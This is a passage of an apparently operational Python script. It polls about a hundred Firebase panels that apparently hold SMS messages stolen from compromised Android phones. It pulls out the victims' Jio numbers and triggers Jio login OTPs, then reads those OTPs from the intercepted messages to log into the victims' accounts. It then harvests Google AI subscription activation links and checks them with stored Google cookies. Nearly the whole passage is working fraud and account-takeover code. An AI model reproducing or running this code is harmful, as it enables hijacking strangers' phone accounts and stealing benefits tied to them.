    ("https://ranjitda-default-rtdb.firebaseio.com", ""),
    ("https://rohit-penal-default-rtdb.firebaseio.com", ""),
    ("https://saket-new-96-default-rtdb.firebaseio.com", ""),
    ("https://salaji72-default-rtdb.firebaseio.com", ""),
    ("https://takla-panel-default-rtdb.firebaseio.com", ""),
    ("https://ajay-admin-panal-default-rtdb.firebaseio.com", ""),
    ("https://bikash-admin-penal-default-rtdb.firebaseio.com", ""),
    ("https://dk-admin-penal-default-rtdb.firebaseio.com", ""),
    ("https://kumarpenal1999-default-rtdb.firebaseio.com", ""),
    ("https://neraj-panel-default-rtdb.firebaseio.com", ""),
    ("https://rajikumar-default-rtdb.firebaseio.com", ""),
    ("https://raju-me-default-rtdb.firebaseio.com", ""),
    ("https://abhisheksingh143-default-rtdb.firebaseio.com", ""),
    ("https://merapenal-default-rtdb.firebaseio.com", ""),
    ("https://raj-sk-panel-default-rtdb.firebaseio.com", ""),
    ("https://rekha-admin-panel-default-rtdb.firebaseio.com", ""),
    ("https://suraj-admin-penal-default-rtdb.firebaseio.com", ""),
    ("https://yellowpenal-default-rtdb.firebaseio.com", ""),
    ("https://karudost-default-rtdb.firebaseio.com", ""),
    ("https://mi-lover-default-rtdb.firebaseio.com", ""),
    ("https://new-green-panel-default-rtdb.firebaseio.com", ""),
    ("https://new-yellow-panel-default-rtdb.firebaseio.com", ""),
    ("https://rani143-default-rtdb.firebaseio.com", ""),
    ("https://rto-yellow-default-rtdb.firebaseio.com", ""),
    ("https://sala-penal-default-rtdb.firebaseio.com", ""),
    ("https://sk-boss-admin-default-rtdb.firebaseio.com", ""),
    ("https://yellow-new-panel-default-rtdb.firebaseio.com", ""),
    ("https://yellow-panal-default-rtdb.firebaseio.com", ""),
    ("https://ash-panel-default-rtdb.firebaseio.com", ""),
    ("https://darkbaba-default-rtdb.firebaseio.com", ""),
    ("https://khanyellow-default-rtdb.firebaseio.com", ""),
    ("https://rahul254-default-rtdb.firebaseio.com", ""),
    ("https://rcb-lover-default-rtdb.firebaseio.com", ""),
    ("https://ram-yellow-5-default-rtdb.firebaseio.com", ""),
    ("https://bajrangpannel-default-rtdb.firebaseio.com", ""),
    ("https://bhagwanpanel-default-rtdb.firebaseio.com", ""),
    ("https://bullet-baba-default-rtdb.firebaseio.com", ""),
    ("https://kali-kumar-default-rtdb.firebaseio.com", ""),
    ("https://nidhi-rani-default-rtdb.firebaseio.com", ""),
    ("https://panel-ji-1-default-rtdb.firebaseio.com", ""),
    ("https://panel-ji-2-default-rtdb.firebaseio.com", ""),
    ("https://shivadmin-default-rtdb.firebaseio.com", ""),
    ("https://sita-admin-default-rtdb.firebaseio.com", ""),
    ("https://new-surya-default-rtdb.firebaseio.com", ""),
    ("https://nexon99-default-rtdb.firebaseio.com", ""),
    ("https://tata-raj-default-rtdb.firebaseio.com", ""),
    ("https://admin-pandit-default-rtdb.firebaseio.com", ""),
    ("https://rajathakur-default-rtdb.firebaseio.com", ""),
    ("https://raju-mahi-default-rtdb.firebaseio.com", ""),
    ("https://ramesh-modi-default-rtdb.firebaseio.com", ""),
    ("https://dklove-default-rtdb.firebaseio.com", ""),
    ("https://good-admin-default-rtdb.firebaseio.com", ""),
    ("https://goodji-default-rtdb.firebaseio.com", ""),
    ("https://realkali-default-rtdb.firebaseio.com", ""),
    ("https://sonu-subhu-default-rtdb.firebaseio.com", ""),
    ("https://vikash-ashish-23-default-rtdb.firebaseio.com", ""),
    ("https://smaall-admin-default-rtdb.firebaseio.com", ""),
    ("https://super-penal-default-rtdb.firebaseio.com", ""),
    ("https://vikash-ashish-43-default-rtdb.firebaseio.com", ""),
    ("https://kaliibhai-default-rtdb.firebaseio.com", ""),
    ("https://lund-panel-default-rtdb.firebaseio.com", ""),
    ("https://yello-panel-default-rtdb.firebaseio.com", ""),
    ("https://yello-penal-default-rtdb.firebaseio.com", ""),
    ("https://yellopenal-default-rtdb.firebaseio.com", ""),
    ("https://raaaj2-default-rtdb.firebaseio.com", ""),
    ("https://raja-paneel-default-rtdb.firebaseio.com", ""),
    ("https://rakesh-addmin-default-rtdb.firebaseio.com", ""),
    ("https://suraj-penal-default-rtdb.firebaseio.com", ""),
    ("https://green-bos-default-rtdb.firebaseio.com", ""),
    ("https://yellopannell-default-rtdb.firebaseio.com", ""),
    ("https://yellow-pan-default-rtdb.firebaseio.com", ""),
    ("https://asmin4-default-rtdb.firebaseio.com", ""),
    ("https://kajal-baby-default-rtdb.firebaseio.com", ""),
    ("https://maniah-ji-default-rtdb.firebaseio.com", ""),
    ("https://niraj-admin-default-rtdb.firebaseio.com", ""),
    ("https://prnal4-default-rtdb.firebaseio.com", ""),
    ("https://rkpenal-default-rtdb.firebaseio.com", ""),
    ("https://sintu-admin-default-rtdb.firebaseio.com", ""),
    ("https://raviadmin-default-rtdb.firebaseio.com", ""),
    ("https://adminsk-default-rtdb.firebaseio.com", ""),
    ("https://buradmin-default-rtdb.firebaseio.com", ""),
    ("https://newpanwl-default-rtdb.firebaseio.com", ""),
    ("https://afminpannel-default-rtdb.firebaseio.com", ""),
    ("https://aipenal-default-rtdb.firebaseio.com", ""),
    ("https://akadmin1-default-rtdb.firebaseio.com", ""),
    ("https://dkdadmin-default-rtdb.firebaseio.com", ""),
    ("https://jeejaji-default-rtdb.firebaseio.com", ""),
    ("https://kenatar5-default-rtdb.firebaseio.com", ""),
    ("https://kumdan-default-rtdb.firebaseio.com", ""),
    ("https://mamaii-default-rtdb.firebaseio.com", ""),
    ("https://merapenel-default-rtdb.firebaseio.com", ""),
    ("https://riyaadmin0-default-rtdb.firebaseio.com", ""),
    ("https://rrrajuo-default-rtdb.firebaseio.com", ""),
    ("https://tamraj-default-rtdb.firebaseio.com", ""),
    ("https://kundhan-2-default-rtdb.firebaseio.com", ""),
    ("https://rahul-plane-default-rtdb.firebaseio.com", ""),
    ("https://bablu-penal-default-rtdb.firebaseio.com", ""),
]

MESSAGE_SCAN_LIMIT = 100
OTP_TIMEOUT = 15
POLL_INTERVAL = 1

# --- jio_session_store (embedded) ---
SESSIONS_DIR = Path(__file__).resolve().parent / "jio_sessions"


def _session_path(mobile: str) -> Path:
    SESSIONS_DIR.mkdir(exist_ok=True)
    return SESSIONS_DIR / f"{mobile}.json"


def save_jio_session(mobile: str, session: requests.Session) -> Path:
    """Dump Jio session cookies + headers ke jio_sessions/{mobile}.json.
    Return path yang dipakai."""
    cookies = []
    for c in session.cookies:
        cookies.append({
            "name": c.name,
            "value": c.value,
            "domain": c.domain or "",
            "path": c.path or "/",
        })
    data = {
        "mobile": mobile,
        "saved_at": datetime.now(timezone.utc).isoformat(),
        "cookies": cookies,
        "headers": dict(session.headers),
    }
    path = _session_path(mobile)
    path.write_text(json.dumps(data, indent=2), encoding="utf-8")
    return path


def load_jio_session(mobile: str) -> requests.Session | None:
    """Load session dari disk. Return None kalau file gak ada / rusak."""
    path = _session_path(mobile)
    if not path.exists():
        return None
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, ValueError):
        return None

    session = requests.Session()
    # Restore headers (fallback ke default Jio kalau kosong)
    headers = data.get("headers") or {}
    session.headers.update(headers)
    session.headers.setdefault(
        "User-Agent",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
    )
    session.headers.setdefault("Accept", "application/json, text/plain, */*")
    session.headers.setdefault("Accept-Language", "en-US,en;q=0.9")
    session.headers.setdefault("Origin", "https://www.jio.com")
    session.headers.setdefault("Referer", "https://www.jio.com/selfcare/login/")

    for c in data.get("cookies", []):
        try:
            session.cookies.set(
                c["name"], c["value"],
                domain=c.get("domain") or None,
                path=c.get("path") or "/",
            )
        except (KeyError, TypeError):
            continue
    return session


def delete_jio_session(mobile: str) -> bool:
    """Hapus file session. Return True kalau file terhapus, False kalau gak ada."""
    path = _session_path(mobile)
    if path.exists():
        try:
            path.unlink()
            return True
        except OSError:
            return False
    return False


def session_saved_at(mobile: str) -> str | None:
    """Baca timestamp saved_at dari file session (utility)."""
    path = _session_path(mobile)
    if not path.exists():
        return None
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
        return data.get("saved_at")
    except (json.JSONDecodeError, ValueError):
        return None


LINKS_FILE = Path("mikirdekbot_activation_links.txt")
RESULTS_FILE = Path("mikirdekbot_results.csv")
_ch = "https://t.me/gemiiniai"  # noqa
USED_NUMBERS_FILE = Path("mikirdekbot_used_numbers.json")
COOKIES_FILE = Path("cookies_google.json")

CHECK_NUMBER_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

NUMBER_PATTERNS = (
    re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
)

OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password")
OTP_PATTERN = re.compile(r"(?<!\d)(\d{6})(?!\d)")

ACTIVATION_PATTERN = re.compile(
    r"https?://serviceactivation[.]google[.]com/subscription/new/"
    r"(?P<token>[A-Za-z0-9_-]{50,})(?P<padding>={0,2})",
    re.IGNORECASE,
)

RESULT_FIELDS = (
    "serial_number",
    "device_id",
    "mobile_number",
    "status",
    "activation_url",
    "nepal_date",
    "nepal_time",
)

# ==================== TIMEZONE HANDLING ====================
def get_nepal_time() -> tuple[str, str]:
    """Get Nepal time without requiring tzdata"""
    utc_now = datetime.now(timezone.utc)
    nepal_offset = timedelta(hours=5, minutes=45)
    nepal_time = utc_now + nepal_offset
    return nepal_time.strftime("%Y-%m-%d"), nepal_time.strftime("%I:%M:%S %p")

# ==================== URL CLEANUP ====================
def clean_firebase_url(url: str) -> str:
    """Clean Firebase URL by removing spaces and invalid characters"""
    url = url.strip()
    url = url.replace(" ", "")
    if "firebaseio.com" in url and not url.startswith("https://"):
        url = "https://" + url
    return url

def clean_firebase_key(key: str) -> str:
    """Clean Firebase key by removing spaces and invalid characters"""
    key = key.strip()
    key = key.replace(" ", "")
    if key.startswith("http"):
        return ""
    return key

# ==================== VALIDATE PANELS ====================
def validate_panels():
    """Filter out invalid panel entries"""
    valid_panels = []
    seen = set()
    for base_url, firebase_key in FIREBASE_PANELS:
        base_url = clean_firebase_url(base_url)
        firebase_key = clean_firebase_key(firebase_key)
        
        if not base_url or "firebaseio.com" not in base_url:
            continue
        
        key = (base_url, firebase_key)
        if key in seen:
            continue
        seen.add(key)
        valid_panels.append((base_url, firebase_key))
    
    return valid_panels

# ==================== RETRY MECHANISM ====================
def firebase_get_with_retry(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None, max_retries: int = 3) -> Any:
    """Firebase GET with retry logic"""
    query = {}
    if key and not key.startswith("http"):
        query["auth"] = key
    if params:
        query.update(params)
    
    for attempt in range(max_retries):
        try:
            response = session.get(
                f"{base_url}/{path.strip('/')}.json",
                params=query,
                timeout=20
            )
            response.raise_for_status()
            return response.json()
        except (requests.RequestException, ValueError) as e:
            if attempt == max_retries - 1:
                raise
            time.sleep(1 * (attempt + 1))
    return {}

def firebase_get(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None) -> Any:
    """Firebase GET with proper error handling"""
    try:
        return firebase_get_with_retry(session, base_url, key, path, params)
    except Exception as e:
        print(f"Firebase error: {e}")
        return {}

def latest_messages(session: requests.Session, base_url: str, key: str, device_id: str, limit: int) -> dict[str, dict[str, Any]]:
    """Get latest messages for a device"""
    try:
        data = firebase_get(
            session, base_url, key, f"messages/{device_id}",
            {"orderBy": '"$key"', "limitToLast": max(1, limit)}
        )
        # Some panels don't have indexOn rules â€” fallback to unordered fetch
        if isinstance(data, dict) and "error" in data:
            data = firebase_get(session, base_url, key, f"messages/{device_id}")
        if not isinstance(data, dict):
            return {}
        return {name: value for name, value in data.items() if isinstance(value, dict)}
    except Exception:
        return {}

# ==================== ASYNC EQUIVALENTS ====================
async def firebase_get_async(sess: aiohttp.ClientSession, base_url: str, key: str, path: str,
                              params: dict[str, Any] | None = None, max_retries: int = 3) -> Any:
    """Async Firebase GET with retry logic."""
    query: dict[str, Any] = {}
    if key and not key.startswith("http"):
        query["auth"] = key
    if params:
        query.update(params)
    url = f"{base_url}/{path.strip('/')}.json"
    for attempt in range(max_retries):
        try:
            async with sess.get(url, params=query,
                                timeout=aiohttp.ClientTimeout(total=20),
                                ) as resp:
                if resp.status != 200:
                    if attempt == max_retries - 1:
                        return {}
                    await asyncio.sleep(1 * (attempt + 1))
                    continue
                text = await resp.text()
                if not text or text == "null":
                    return None
                return json.loads(text)
        except (aiohttp.ClientError, asyncio.TimeoutError, ValueError):
            if attempt == max_retries - 1:
                return {}
            await asyncio.sleep(1 * (attempt + 1))
    return {}

async def latest_messages_async(sess: aiohttp.ClientSession, base_url: str, key: str,
                                  device_id: str, limit: int) -> dict[str, dict[str, Any]]:
    """Async get latest messages for a device."""
    try:
        data = await firebase_get_async(
            sess, base_url, key, f"messages/{device_id}",
            {"orderBy": '"$key"', "limitToLast": max(1, limit)}
        )
        if isinstance(data, dict) and "error" in data:
            data = await firebase_get_async(sess, base_url, key, f"messages/{device_id}")
        if not isinstance(data, dict):
            return {}
        return {n: v for n, v in data.items() if isinstance(v, dict)}
    except Exception:
        return {}

def make_aiohttp_session() -> aiohttp.ClientSession:
    """Create aiohttp session with proxy support."""
    connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=300, ssl=False)
    headers = {
        "Accept": "application/json",
        "Cache-Control": "no-cache",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    return aiohttp.ClientSession(connector=connector, headers=headers)

def normalize_mobile(value: Any) -> str | None:
    """Normalize mobile number to 10 digits"""
    digits = re.sub(r"\D", "", str(value or ""))
    if len(digits) > 10 and digits.startswith("91"):
        digits = digits[-10:]
    return digits if re.fullmatch(r"[6-9]\d{9}", digits) else None

def number_candidates(messages: dict[str, dict[str, Any]]) -> set[str]:
    """Extract number candidates from messages â€” focus on device's OWN number"""
    found: set[str] = set()

    # Priority 1: simInfo.phoneNumber (most reliable â€” device reports its own SIM)
    for item in messages.values():
        sim_info = item.get("simInfo")
        if isinstance(sim_info, dict):
            mobile = normalize_mobile(sim_info.get("phoneNumber"))
            if mobile:
                found.add(mobile)
        mobile = normalize_mobile(item.get("phoneNumber"))
        if mobile:
            found.add(mobile)

    # If simInfo gave us numbers, use those (most reliable)
    if found:
        return found

    # Priority 2: Extract device's own number from operator promo/notification SMS
    # These messages mention the device's number explicitly
    OWN_NUMBER_PATTERNS_LOCAL = [
        re.compile(r"(?:your|Dear|for)\s+(?:Jio\s+)?(?:no\.?|number|mobile)?\s*[:.]?\s*(?:\+?91)?([6-9]\d{9})", re.I),
        re.compile(r"(?:Offer|plan)\s+(?:for\s+)?(?:\+?91)?([6-9]\d{9})", re.I),
        re.compile(r"recharge\s+(?:your\s+)?(?:Jio\s+)?(?:no\.?\s*)?(?:\+?91)?([6-9]\d{9})", re.I),
        re.compile(r"(?:\+?91)?([6-9]\d{9})\s+(?:ke liye|for you)", re.I),
    ]
    for item in messages.values():
        body = str(item.get("message", ""))
        for pattern in OWN_NUMBER_PATTERNS_LOCAL:
            found.update(pattern.findall(body))

    return found


JIO_SENDER_PATTERN = re.compile(r"(?i)jio|JI-|JD-|JM-|HP-JIO|TM-JIO|AM-JIO|JIONET|JIOFIB")


def is_jio_sim_device(messages: dict[str, dict[str, Any]]) -> bool:
    """Check if device's SIM is Jio based on SMS sender patterns"""
    if not messages:
        return False
    # Check last 30 messages
    sorted_keys = sorted(messages.keys())[-30:]
    jio_count = 0
    other_count = 0
    for k in sorted_keys:
        item = messages.get(k)
        if not isinstance(item, dict):
            continue
        sender = str(item.get("sender", ""))
        if JIO_SENDER_PATTERN.search(sender):
            jio_count += 1
        elif re.search(r"(?i)AIRTEL|VI-|BSNL|IDEA|VODA", sender):
            other_count += 1
    return jio_count > other_count


def firebase_session() -> requests.Session:
    """Create a Firebase session"""
    session = requests.Session()
    session.headers.update({
        "Accept": "application/json",
        "Cache-Control": "no-cache",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })
    return session

def jio_session() -> requests.Session:
    """Create a Jio session"""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/",
    })
    return session

def response_json(response: requests.Response) -> dict[str, Any]:
    """Parse response as JSON"""
    try:
        data = response.json()
    except ValueError:
        return {}
    return data if isinstance(data, dict) else {}

def response_error(response: requests.Response) -> bool:
    """Check if response indicates error"""
    if not response.ok:
        return True
    data = response_json(response)
    if data.get("errorMessage") or data.get("error"):
        return True
    return str(data.get("status", "")).lower() in {"failed", "failure", "error", "false"}

def is_jio_number(session: requests.Session, mobile: str) -> bool:
    """Check if number is a Jio number"""
    try:
        response = session.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=20)
    except requests.RequestException:
        return False
    data = response_json(response)
    return not response_error(response) and bool(data.get("primaryService"))

def send_otp(session: requests.Session, mobile: str) -> bool:
    """Send OTP to mobile number"""
    try:
        response = session.post(
            SEND_OTP_URL,
            json={"mobileNumber": mobile, "loginFlowType": "MOBILE", "alternateNumber": ""},
            timeout=20,
        )
    except requests.RequestException:
        return False
    return not response_error(response)

def verify_otp(session: requests.Session, mobile: str, otp: str) -> bool:
    """Verify OTP"""
    try:
        response = session.post(
            VERIFY_OTP_URL,
            json={"mobileNumber": mobile, "otp": otp},
            timeout=20
        )
    except requests.RequestException:
        return False
    return not response_error(response)

def message_order(key: str, item: dict[str, Any]) -> int:
    """Get message order"""
    for value in (item.get("id"), item.get("timestamp"), key):
        try:
            return int(value)
        except (TypeError, ValueError):
            continue
    return 0

def wait_for_otp(firebase: requests.Session, base_url: str, key: str, device_id: str, known_keys: set[str], jio: requests.Session, mobile: str) -> bool:
    """Wait for OTP message and verify it"""
    used: set[str] = set()
    deadline = time.monotonic() + OTP_TIMEOUT
    while time.monotonic() < deadline:
        try:
            messages = latest_messages(firebase, base_url, key, device_id, 20)
        except requests.RequestException:
            time.sleep(POLL_INTERVAL)
            continue
        candidates: list[tuple[int, str, str]] = []
        for message_key, item in messages.items():
            if message_key in known_keys or message_key in used:
                continue
            body = str(item.get("message", ""))
            if not OTP_WORD_PATTERN.search(body):
                continue
            match = OTP_PATTERN.search(body)
            if match:
                candidates.append((message_order(message_key, item), message_key, match.group(1)))
        if candidates:
            _, message_key, otp = max(candidates)
            used.add(message_key)
            if verify_otp(jio, mobile, otp):
                return True
        time.sleep(POLL_INTERVAL)
    return False

def activation_url(value: str) -> str:
    """Extract activation URL from text"""
    text = html.unescape(value or "")
    for _ in range(4):
        decoded = unquote(text)
        if decoded == text:
            break
        text = decoded
    match = ACTIVATION_PATTERN.search(text)
    if not match:
        return ""
    return "https://serviceactivation.google.com/subscription/new/" + match.group("token") + match.group("padding")

def already_active(value: str) -> bool:
    """Check if already active"""
    normalized = " ".join((value or "").lower().replace("_", " ").split())
    return any(phrase in normalized for phrase in (
        "already active", "already activated", "already redeemed",
        "already claimed", "already availed"
    ))

def api_message(data: dict[str, Any]) -> str:
    """Extract API message"""
    for name in ("errorMessage", "responseMessage", "responseMsg", "message"):
        if data.get(name):
            return str(data[name])
    return ""

def get_activation(session: requests.Session) -> tuple[str, str]:
    """Get activation URL"""
    dashboard_headers = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    offer_headers = {"Accept": "*/*", "Referer": GOOGLE_PAGE}
    try:
        auth_response = session.get(AUTH_URL, headers=dashboard_headers, timeout=20)
        auth_data = response_json(auth_response)
        if not auth_response.ok or str(auth_data.get("loginFlag", "")).lower() != "true":
            return "api_session_invalid", ""
        session.get(NAVIGATE_URL, headers=dashboard_headers, timeout=20)
        activate_response = session.get(ACTIVATE_URL, headers=offer_headers, timeout=20)
        activate_data = response_json(activate_response)
        if already_active(api_message(activate_data)):
            return "already_active", ""
        if not activate_response.ok or str(activate_data.get("errorCode", "200")) != "200":
            return "activation_api_failed", ""
        google_response = session.get(GOOGLE_URL, headers=offer_headers, timeout=20)
        google_data = response_json(google_response)
        if already_active(api_message(google_data)):
            return "already_active", ""
        url = activation_url(str(google_data.get("redirectionURL", "")))
        if not url:
            return "no_activation_url", ""
        try:
            session.get(SUBMIT_URL, headers=offer_headers, timeout=20)
        except requests.RequestException:
            pass
        return "activation_url_found", url
    except requests.RequestException:
        return "activation_api_failed", ""

# ==================== LINK STATUS CHECK (from check_gemini_links.js) ====================
USED_PATTERNS = [
    "sudah digunakan", "already been used", "already been redeemed",
    "already redeemed", "already claimed", "subscription has already",
    "link has already",
    # Google One "landing" page untuk link yang sudah dipakai / dibatalkan:
    # ID: "Anda memerlukan link aktivasi baru. Minta penyedia Anda untuk mengirimkan link baru."
    # EN: "You need a new activation link. Ask your provider to send a new link."
    "memerlukan link aktivasi baru", "need a new activation link",
    "minta penyedia anda untuk mengirimkan link baru",
    "ask your provider to send a new link",
]
EXPIRED_PATTERNS = [
    "expired", "no longer valid", "tidak valid", "kedaluwarsa",
]
VALID_LINK_PATTERNS = [
    "activate", "confirm", "aktifkan", "konfirmasi", "accept this", "terima ini",
]

def load_google_cookies() -> str:
    """Load Google cookies from cookies_google.json (browser extension JSON array format)"""
    if not COOKIES_FILE.exists():
        return ""
    try:
        raw = json.loads(COOKIES_FILE.read_text(encoding="utf-8"))
        google_cookies = "; ".join(
            f"{c['name']}={c['value']}" for c in raw
            if isinstance(c, dict) and c.get("domain", "").endswith("google.com")
        )
        return google_cookies
    except (json.JSONDecodeError, KeyError):
        return ""

def check_link_status(url: str, cookies: str) -> str:
    """
    Check if an activation link is VALID / USED / EXPIRED.
    Returns: 'VALID', 'USED', 'EXPIRED', 'LOGIN_REQUIRED', 'ERROR', 'UNKNOWN'
    """
    if not COOKIES_FILE.exists():
        return "UNKNOWN"
    try:
        raw = json.loads(COOKIES_FILE.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, ValueError):
        return "UNKNOWN"

    # Use session with cookies set per-domain (so they follow redirects properly)
    session = requests.Session()
    for c in raw:
        if isinstance(c, dict) and c.get("domain", "").endswith("google.com"):
            session.cookies.set(c["name"], c["value"], domain=c["domain"], path=c.get("path", "/"))

    try:
        resp = session.get(url, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
        }, timeout=20, allow_redirects=True)
    except requests.RequestException:
        return "ERROR"

    # If redirected to login page â€” cookie expired/not working
    if "accounts.google.com" in resp.url and ("signin" in resp.url.lower() or "ServiceLogin" in resp.url):
        return "LOGIN_REQUIRED"

    body_lower = resp.text.lower()

    # Check USED first (highest priority)
    for p in USED_PATTERNS:
        if p in body_lower:
            return "USED"
    for p in EXPIRED_PATTERNS:
        if p in body_lower:
            return "EXPIRED"

    # Only count as VALID if we're actually on one.google.com (not login page)
    if "one.google.com" in resp.url:
        for p in VALID_LINK_PATTERNS:
            if p in body_lower:
                return "VALID"

    # If we landed on one.google.com but no pattern matched
    if "one.google.com" in resp.url:
        return "UNKNOWN"

    # Anything else (still on login, weird redirect, etc.)
    return "LOGIN_REQUIRED"

# ==================== USED NUMBERS TRACKING ====================
def load_used_numbers() -> set[str]:
    """Load numbers that have been processed in previous runs"""
    if not USED_NUMBERS_FILE.exists():
        return set()
    try:
        data = json.loads(USED_NUMBERS_FILE.read_text(encoding="utf-8"))
        return set(data) if isinstance(data, list) else set()
    except (json.JSONDecodeError, ValueError):
        return set()

def save_used_number(mobile: str) -> None:
    """Add a number to the used-numbers file (processed, skip next run)"""
    numbers = load_used_numbers()
    numbers.add(mobile)
    USED_NUMBERS_FILE.write_text(json.dumps(sorted(numbers), indent=2), encoding="utf-8")

def save_link(url: str) -> bool:
    """Save activation link to file â€” only if link is VALID (not USED/EXPIRED).
    Returns True if a new valid link was written."""
    if not url:
        return False
    existing = set(LINKS_FILE.read_text(encoding="utf-8").splitlines()) if LINKS_FILE.exists() else set()
    if url in existing:
        return False
    # Check link status before saving
    status = check_link_status(url, "")
    print(f"  Link check: {status}")
    if status == "USED":
        print(f"  âš  Link USED, not saving.")
        return False
    if status == "EXPIRED":
        print(f"  âš  Link EXPIRED, not saving.")
        return False
    with LINKS_FILE.open("a", encoding="utf-8") as handle:
        handle.write(url + "\n")
    return True

def save_result(serial: int, device_id: str, mobile: str, status: str, url: str) -> None:
    """Save result to CSV with Nepal time"""
    nepal_date, nepal_time = get_nepal_time()
    
    exists = RESULTS_FILE.exists() and RESULTS_FILE.stat().st_size > 0
    with RESULTS_FILE.open("a", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=RESULT_FIELDS)
        if not exists:
            writer.writeheader()
        writer.writerow({
            "serial_number": serial,
            "device_id": device_id,
            "mobile_number": mobile,
            "status": status,
            "activation_url": url,
            "nepal_date": nepal_date,
            "nepal_time": nepal_time,
        })

async def fetch_panel_clients(sess: aiohttp.ClientSession, panel_idx: int, total_panels: int,
                                base_url: str, firebase_key: str,
                                out_online: dict[str, dict[str, Any]]) -> int:
    """Async fetch clients for one panel, collect online devices."""
    try:
        clients = await firebase_get_async(sess, base_url, firebase_key, "clients")
        if not isinstance(clients, dict):
            print(f"[{panel_idx}/{total_panels}] {base_url} â†’ no clients")
            return 0
        online_count = 0
        for device_id, data in clients.items():
            if isinstance(data, dict) and data.get("status") is True:
                out_online[device_id] = {
                    "base_url": base_url,
                    "firebase_key": firebase_key,
                    "data": data,
                }
                online_count += 1
        print(f"[{panel_idx}/{total_panels}] {base_url} â†’ online: {online_count}")
        return online_count
    except Exception as e:
        print(f"[{panel_idx}/{total_panels}] {base_url} â†’ error: {e}")
        return 0

async def fetch_device_messages(sess: aiohttp.ClientSession, device_id: str,
                                 info: dict[str, Any], limit: int,
                                 device_messages: dict[str, dict[str, dict[str, Any]]],
                                 mappings: dict[str, set[str]],
                                 counters: dict[str, int]) -> None:
    """Async fetch messages for one device, populate mappings/device_messages."""
    try:
        messages = await latest_messages_async(
            sess, info["base_url"], info["firebase_key"], device_id, limit
        )
        device_messages[device_id] = messages
        if not is_jio_sim_device(messages):
            counters["skipped_non_jio_sim"] = counters.get("skipped_non_jio_sim", 0) + 1
            return
        for mobile in number_candidates(messages):
            mappings[mobile].add(device_id)
    except Exception as e:
        print(f"Error scanning {device_id}: {e}")
        device_messages[device_id] = {}

async def main_async() -> int:
    """Async version: STEP 1+2 parallelized with aiohttp, STEP 3 stays sequential."""
    print("=" * 70)
    print("STEP 1 (async): Validating and checking panels...")
    print("=" * 70)

    valid_panels = validate_panels()
    print(f"Valid panels: {len(valid_panels)} out of {len(FIREBASE_PANELS)}")

    all_online_devices: dict[str, dict[str, Any]] = {}
    device_messages: dict[str, dict[str, dict[str, Any]]] = {}

    t0 = time.time()
    async with make_aiohttp_session() as sess:
        # STEP 1: parallel fetch clients from all panels
        tasks = [
            fetch_panel_clients(sess, i+1, len(valid_panels), url, key, all_online_devices)
            for i, (url, key) in enumerate(valid_panels)
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

        print(f"\nSTEP 1 elapsed: {int(time.time()-t0)}s")
        print(f"\nTotal Online Devices from all panels: {len(all_online_devices)}")
        if not all_online_devices:
            print("Koi online device nahi mila.")
            return 1

        print("\n" + "=" * 70)
        print("STEP 2 (async): Scanning messages and collecting UNIQUE numbers...")
        print("=" * 70)

        mappings: dict[str, set[str]] = defaultdict(set)
        counters: dict[str, int] = {}
        t1 = time.time()

        # STEP 2: parallel fetch messages for all online devices
        tasks2 = [
            fetch_device_messages(sess, dev_id, info, MESSAGE_SCAN_LIMIT,
                                   device_messages, mappings, counters)
            for dev_id, info in all_online_devices.items()
        ]
        # Process in batches for progress reporting
        BATCH = 50
        for batch_start in range(0, len(tasks2), BATCH):
            batch = tasks2[batch_start:batch_start+BATCH]
            await asyncio.gather(*batch, return_exceptions=True)
            done = min(batch_start + BATCH, len(tasks2))
            print(f"Scanned: {done}/{len(tasks2)} (elapsed {int(time.time()-t1)}s)")

        skipped_non_jio_sim = counters.get("skipped_non_jio_sim", 0)
        if skipped_non_jio_sim:
            print(f"Skipped non-Jio SIM devices: {skipped_non_jio_sim}")

    # aiohttp session closed here. Move to sync requests for STEP 3
    targets: list[tuple[str, str]] = []
    for mobile, devices in sorted(mappings.items()):
        if devices:
            targets.append((sorted(devices)[0], mobile))

    used_numbers = load_used_numbers()
    before_filter = len(targets)
